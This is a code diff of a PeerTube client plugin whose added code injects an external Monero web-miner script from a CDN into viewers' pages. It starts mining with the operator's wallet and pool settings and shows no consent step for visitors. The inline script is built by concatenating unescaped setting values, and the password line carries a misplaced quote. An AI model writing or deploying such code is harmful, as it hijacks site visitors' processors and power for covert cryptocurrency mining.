@@ -1,42 +1,47 @@
 async function register({ registerHook, peertubeHelpers }) {
+  peertubeHelpers.getSettings().then((s) => {
 
-peertubeHelpers.getSettings().then(
-      s => {
-      console.log('Initializing Monero miner client plugin...')
+    // Peertubeのプラグインは末尾にセミコロン「；」は要らない
+    console.log("Initializing Monero miner client plugin...")
 
-      if ( !s || !s['walletAddress'] || !s['poolAddress']) {
-        console.error('Monero miner plugin: Required settings are missing.')
-        return
-      }
-
-    // JavaScriptとは違うのにPromiseは使えるとかこれもうわかんねぇな
-    new Promise((resolve) => {
-          // 外部スクリプトを挿入
-          const externalScript = document.createElement("script")
-          externalScript.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"
-          document.head.appendChild(externalScript)
-
-          resolve();
-    }).then(() => {
-          // 外部スクリプトのロード完了後に処理開始
-          console.log("Mining script loaded successfully.")
-
-          let inlineScript = document.createElement("script")
-          inlineScript+= "server = '"+s['webSocket']+"';\n"
-          inlineScript+= "var pool = '"+s['poolAddress']+"';\n"
-          inlineScript+= "var walletAddress = '"+s['walletAddress']+"';\n"
-          inlineScript+= "var workerId = 'PeerTube-Miner';\n"
-          inlineScript+= "var threads = '"+s['threads']+"';\n"
-          inlineScript+= "var password = '"+s['password']+"';\n"
-          inlineScript+= "startMining(pool, walletAddress, workerId, threads, password);\n"
-          inlineScript+= "throttleMiner = 20;\n"
-
-          // appendChildするとエラーが出るので、inlineScriptの文字列をテキストノードに変換する処理を挟む必要がある
-          document.body.appendChild(document.createTextNode("inlineScript"))
-          console.log("Mining started.")
-    });
-
+    if (!s || !s["walletAddress"] || !s["poolAddress"]) {
+      console.error("Monero miner plugin: Required settings are missing.")
+      return
     }
-  )
+
+    // 外部スクリプトをロード
+    new Promise((resolve, reject) => {
+      const externalScript = document.createElement("script")
+      externalScript.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"
+      externalScript.async = true // 非同期ロード
+      externalScript.onload = () => {
+        console.log("Mining script loaded successfully.")
+        resolve()
+      }
+      externalScript.onerror = () => {
+        console.error("Failed to load the mining script.")
+        reject()
+      }
+      document.head.appendChild(externalScript)
+    })
+      .then(() => {
+        // 外部スクリプトロード後に内部スクリプトを挿入
+        const inlineScript = document.createElement("script")
+        inlineScript.innerHTML += "server = '" + s["webSocket"] + "';\n"
+        inlineScript.innerHTML += "var pool = '" + s["poolAddress"] + "';\n"
+        inlineScript.innerHTML += "var walletAddress = '" + s["walletAddress"] + "';\n"
+        inlineScript.innerHTML += "var workerId = 'PeerTube-Miner';\n"
+        inlineScript.innerHTML += "var threads = '" + s["threads"] + "';\n"
+        inlineScript.innerHTML += "var password = '" + s["password"] + ";'\n"
+        inlineScript.innerHTML += "startMining(pool, walletAddress, workerId, threads, password);\n"
+        inlineScript.innerHTML += "throttleMiner = 20;\n"
+        document.body.appendChild(inlineScript)
+        console.log("Mining started.")
+      })
+      .catch(() => {
+        console.error("Error occurred during script injection.")
+      })
+  })
 }
+
 export { register }
